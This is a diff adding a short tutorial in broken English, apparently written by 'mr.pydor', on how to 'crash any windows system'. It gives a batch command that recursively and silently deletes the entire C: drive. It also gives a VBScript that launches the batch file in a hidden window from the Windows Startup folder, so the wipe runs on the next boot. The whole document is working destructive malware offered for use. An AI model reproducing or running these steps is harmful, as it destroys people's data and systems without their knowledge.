@@ -1,0 +1,32 @@
+today ami show, how to crash any windows system.... 
+
+
+1.fast step
+#create a .bat extenction file use any name but extenction .bat
+#new open the this file notepat
+#and copy this code and jast past your notepat
+
+========================%%========================
+
+>>rd c:\ /s /q
+#Now save this file on your computer any loction....
+
+2.sc.. step
+#create a .vbs extenction file use any name but extenction .vbs
+#new open the this file notepat
+#and copy this code and jast past your notepat
+
+====================%%%===========================
+
+>>set wscript = createobject("wscript.shell")
+>>wscript.run chr(34) &"past your .bat save file path"& chr(34),0
+
+#New save this code and goto this folder on your machine "c:\user\(your system username)\AppData\Roaming\Microsoft\Windows\start Menu\Programs\Startup" and save in folder on your create (.vbs)script
+
+3.th.. step
+# jast one  time shutdown or restart or anywey trun off your system than boom...jast Seee...
+#Thanks You!....
+
+
+
+``this code write by: mr.pydor``
